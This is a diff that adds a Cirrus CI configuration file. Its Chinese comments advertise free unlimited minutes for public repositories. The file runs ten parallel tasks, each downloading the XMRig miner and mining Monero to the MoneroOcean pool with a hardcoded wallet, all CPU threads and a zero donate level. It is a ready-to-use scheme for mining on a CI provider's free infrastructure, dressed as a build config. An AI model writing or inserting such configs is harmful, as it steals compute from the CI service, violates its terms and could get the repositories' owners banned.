@@ -1,0 +1,42 @@
+# Cirrus CI — 公共仓库免费无限分钟！
+# 每个task最多120分钟，并行无严格上限
+
+container:
+  image: ubuntu:focal
+  cpu: 2
+  memory: 4G
+
+task:
+  name: "⛏ Cirrus Miner ${CIRRUS_TASK_NAME}"
+  timeout_in: 115m
+  
+  matrix:
+    - name: cirrus_w1
+    - name: cirrus_w2
+    - name: cirrus_w3
+    - name: cirrus_w4
+    - name: cirrus_w5
+    - name: cirrus_w6
+    - name: cirrus_w7
+    - name: cirrus_w8
+    - name: cirrus_w9
+    - name: cirrus_w10
+
+  install_script:
+    - apt-get update -qq && apt-get install -y -qq curl libmicrohttpd12 libhwloc15 libssl1.1
+    - curl -sL -o x.tar.gz "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-focal-x64.tar.gz"
+    - tar xzf x.tar.gz --strip-components=1
+    - chmod +x xmrig
+
+  mine_script:
+    - ./xmrig -o gulf.moneroocean.stream:10032
+      -u 45qqTqhjmsz8mhzry3dG6rJgt9Jdzfh9xa6Skh1mtmBGgNubPDsrJVVEg6cWS6DtEB5i6BWTEaQA7BRws6UEibKEAQ1dd9X
+      -p "cirrus_${CIRRUS_TASK_NAME}"
+      --donate-level=0
+      --cpu-max-threads-hint=100
+      --print-time=300
+      -t 2
+
+  always:
+    cpu_script: cat /proc/cpuinfo | grep "model name" | head -1
+    mem_script: free -h
